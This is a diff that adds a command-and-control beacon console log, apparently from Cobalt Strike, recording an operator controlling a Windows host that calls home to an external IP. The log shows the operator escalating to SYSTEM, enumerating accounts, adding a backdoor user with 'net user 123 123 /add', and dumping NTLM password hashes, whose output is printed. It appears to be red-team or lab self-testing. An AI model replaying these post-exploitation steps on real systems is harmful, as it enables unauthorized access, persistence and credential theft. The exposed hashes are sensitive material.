@@ -1,0 +1,192 @@
+11/19 04:52:01 UTC [metadata] 23.158.104.160 <- 192.168.1.13; computer: NOT-FOUND-404; user: kaeiy *; process: beacon_x86.exe; pid: 16244; os: Windows; version: 6.2; build: 9200; beacon arch: x86 (x64)
+11/19 04:51:57 UTC [task] <T1029> Tasked beacon to sleep for 30s (30% jitter)
+11/19 04:51:57 UTC [note] Bid: 1453686000  NT: 6.2
+11/19 04:51:57 UTC [task] <T1029> Tasked beacon to become interactive
+11/19 04:51:57 UTC [task] <T1029> Tasked beacon to sleep for 10s (30% jitter)
+11/19 04:51:57 UTC [note]   Ver: 6.2
+11/19 04:52:21 UTC [input] <admin1> sleep 0
+11/19 04:52:21 UTC [task] <T1029> Tasked beacon to become interactive
+11/19 04:52:58 UTC [checkin] host called home, sent: 64 bytes
+11/19 04:53:35 UTC [input] <admin1> shell monte.exe
+11/19 04:53:35 UTC [task] <T1059> Tasked beacon to run: monte.exe
+11/19 04:53:35 UTC [checkin] host called home, sent: 40 bytes
+11/19 04:53:37 UTC [output]
+received output:
+'monte.exe' 不是内部或外部命令，也不是可运行的程序
+或批处理文件。
+
+
+11/19 04:53:57 UTC [input] <admin1> shell moneta.exe -m ioc -p 9108
+11/19 04:53:57 UTC [task] <T1059> Tasked beacon to run: moneta.exe -m ioc -p 9108
+11/19 04:54:05 UTC [checkin] host called home, sent: 56 bytes
+11/19 04:54:12 UTC [output]
+received output:
+'moneta.exe' 不是内部或外部命令，也不是可运行的程序
+或批处理文件。
+
+
+11/19 04:57:46 UTC [input] <admin1> shell moneta64.exe
+11/19 04:57:46 UTC [task] <T1059> Tasked beacon to run: moneta64.exe
+11/19 04:57:46 UTC [checkin] host called home, sent: 43 bytes
+11/19 04:57:54 UTC [output]
+received output:
+'moneta64.exe' 不是内部或外部命令，也不是可运行的程序
+或批处理文件。
+
+
+11/19 04:58:04 UTC [input] <admin1> shell moneta64.exe
+11/19 04:58:04 UTC [task] <T1059> Tasked beacon to run: moneta64.exe
+11/19 04:58:06 UTC [checkin] host called home, sent: 43 bytes
+11/19 04:58:13 UTC [output]
+received output:
+'moneta64.exe' 不是内部或外部命令，也不是可运行的程序
+或批处理文件。
+
+
+11/19 04:58:31 UTC [input] <admin1> ls
+11/19 04:58:31 UTC [task] <> Tasked beacon to list files in .
+11/19 04:58:34 UTC [checkin] host called home, sent: 19 bytes
+11/19 04:58:36 UTC [output]
+C:\Users\11502\Desktop\*
+D	0	11/19/2023 12:57:59	.
+D	0	11/19/2023 12:57:59	..
+D	0	11/14/2023 20:30:18	1.12.2 DoomsDay （普通难度版）
+F	672686	11/03/2023 15:18:03	api.txt
+F	19029	11/01/2023 14:54:32	api2.txt
+F	19456	11/19/2023 11:44:03	artifact_x64.exe
+D	0	11/14/2023 05:46:56	atomic-red-team-master
+F	131417796	11/17/2023 14:41:17	atomic-red-team-master.zip
+F	310784	11/19/2023 12:52:14	beacon_x86.exe
+F	282	01/28/2023 15:56:31	desktop.ini
+D	0	08/24/2023 09:42:04	DownKyi-1.5.9
+F	2254	11/14/2023 10:28:20	Google Chrome.lnk
+F	30648	11/14/2023 14:19:14	ip.txt
+F	431	06/07/2023 13:42:57	main1.py
+F	613	10/22/2023 21:31:53	MDPro2.lnk
+F	11809398	10/13/2023 12:57:25	meow-master.zip
+F	1122	05/27/2023 15:12:25	navicat.exe.lnk
+F	58629120	09/17/2023 00:03:24	nuclei.exe
+F	986	11/02/2023 10:38:28	ONE-FOX集成工具箱V5魔改版.lnk
+F	1092	11/17/2022 16:45:23	Proxifier.lnk
+F	56846767	11/18/2023 21:02:02	RedTeamNotes-main.zip
+F	637	09/11/2022 15:31:58	Telegram.lnk
+F	71406	02/23/2022 17:01:56	user.txt
+D	0	11/06/2023 10:02:23	Web-SurvivalScan-1.04
+F	587	10/25/2023 10:31:04	Wondershare EdrawMax.lnk
+F	1031	11/01/2023 10:53:48	Xshell.lnk
+F	2326	10/27/2023 15:55:57	Yakit.lnk
+F	162	10/13/2023 17:20:09	~$230915【变更测试】新华财经专业终端【20230915】变更测试报告【王孟岩】.docx
+F	162	07/07/2023 16:54:15	~$福利云微信公众号存在短信轰炸漏洞渗透测试报告.docx
+F	162	10/01/2022 19:08:50	~$资知识点整点.docx
+D	0	11/19/2023 11:32:29	当前任务
+F	1230	07/27/2023 10:06:03	恐怖黎明.lnk
+F	680	05/26/2022 14:50:17	渗透工具.lnk
+F	704	05/25/2022 19:23:32	百度网盘.lnk
+F	1656	09/17/2023 00:22:00	迅雷.lnk
+F	33838080	02/01/2023 14:00:54	金盾播放器.exe
+
+
+11/19 04:58:37 UTC [input] <admin1> pwd
+11/19 04:58:37 UTC [task] <> Tasked beacon to print working directory
+11/19 04:58:42 UTC [checkin] host called home, sent: 8 bytes
+11/19 04:58:49 UTC [output]
+Current directory is C:\Users\11502\Desktop
+
+11/19 04:58:53 UTC [input] <admin1> shell moneta.exe -m ioc -p 9108
+11/19 04:58:53 UTC [task] <T1059> Tasked beacon to run: moneta.exe -m ioc -p 9108
+11/19 04:58:57 UTC [checkin] host called home, sent: 56 bytes
+11/19 04:58:58 UTC [output]
+received output:
+   _____                        __          
+  /     \   ____   ____   _____/  |______   
+ /  \ /  \ /  _ \ /    \_/ __ \   __\__  \  
+/    Y    (  <_> )   |  \  ___/|  |  / __ \_
+\____|__  /\____/|___|  /\___  >__| (____  /
+        \/            \/     \/          \/ 
+
+Moneta v1.0 | Forrest Orr | 2020
+
+... failed to map address space of 9108 (error 1)
+
+... scan completed (0.000000 second duration)
+
+
+11/19 05:00:02 UTC [input] <admin1> shell moneta.exe -m ioc -p 9108
+11/19 05:00:02 UTC [task] <T1059> Tasked beacon to run: moneta.exe -m ioc -p 9108
+11/19 05:00:04 UTC [checkin] host called home, sent: 56 bytes
+11/19 05:00:05 UTC [output]
+received output:
+   _____                        __          
+  /     \   ____   ____   _____/  |______   
+ /  \ /  \ /  _ \ /    \_/ __ \   __\__  \  
+/    Y    (  <_> )   |  \  ___/|  |  / __ \_
+\____|__  /\____/|___|  /\___  >__| (____  /
+        \/            \/     \/          \/ 
+
+Moneta v1.0 | Forrest Orr | 2020
+
+... failed to map address space of 9108 (error 1)
+
+... scan completed (0.000000 second duration)
+
+
+11/19 05:06:52 UTC [input] <admin1> AceLdr.x64.bin
+11/19 05:06:52 UTC [error] Unknown command: AceLdr.x64.bin
+11/19 05:08:23 UTC [input] <admin1> getsystem
+11/19 05:08:23 UTC [task] <T1134> Tasked beacon to get SYSTEM
+11/19 05:08:23 UTC [checkin] host called home, sent: 2503 bytes
+11/19 05:08:24 UTC [output]
+Impersonated NT AUTHORITY\SYSTEM
+
+11/19 05:08:30 UTC [input] <admin1> shell whoami
+11/19 05:08:31 UTC [task] <T1059> Tasked beacon to run: whoami
+11/19 05:08:31 UTC [checkin] host called home, sent: 37 bytes
+11/19 05:08:32 UTC [output]
+received output:
+nt authority\system
+
+
+11/19 05:08:34 UTC [input] <admin1> rev2self
+11/19 05:08:34 UTC [task] <T1134> Tasked beacon to revert token
+11/19 05:08:39 UTC [checkin] host called home, sent: 8 bytes
+11/19 05:08:44 UTC [input] <admin1> net user
+11/19 05:08:44 UTC [task] <T1087, T1093> Tasked beacon to run net user on localhost
+11/19 05:08:44 UTC [checkin] host called home, sent: 87649 bytes
+11/19 05:08:49 UTC [output]
+received output:
+Users for \\localhost:
+
+Administrator (admin)
+DefaultAccount
+Guest
+kaeiy (admin)
+WDAGUtilityAccount
+
+
+11/19 05:08:52 UTC [input] <admin1> net user 12
+11/19 05:08:52 UTC [task] <T1087, T1093> Tasked beacon to run net user 12 on localhost
+11/19 05:08:53 UTC [checkin] host called home, sent: 87649 bytes
+11/19 05:08:57 UTC [output]
+received output:
+Account information for 12 on \\localhost:
+
+[-] Error: 2221
+
+
+11/19 05:09:01 UTC [input] <admin1> net user 123 123 /add
+11/19 05:09:01 UTC [error] net error: argument '123' is not a \\target
+11/19 05:09:07 UTC [input] <admin1> shell net user 123 123 /add
+11/19 05:09:07 UTC [task] <T1059> Tasked beacon to run: net user 123 123 /add
+11/19 05:09:12 UTC [checkin] host called home, sent: 52 bytes
+11/19 05:09:37 UTC [input] <admin1> hashdump
+11/19 05:09:37 UTC [task] <T1003, T1055, T1093> Tasked beacon to dump hashes
+11/19 05:09:44 UTC [checkin] host called home, sent: 82541 bytes
+11/19 05:09:53 UTC [output]
+received password hashes:
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+kaeiy:1001:aad3b435b51404eeaad3b435b51404ee:473471a51a9945c889013837b394cb75:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e8fb7a3e7d0ebb9fa2c20b52ff524eda:::
+
+
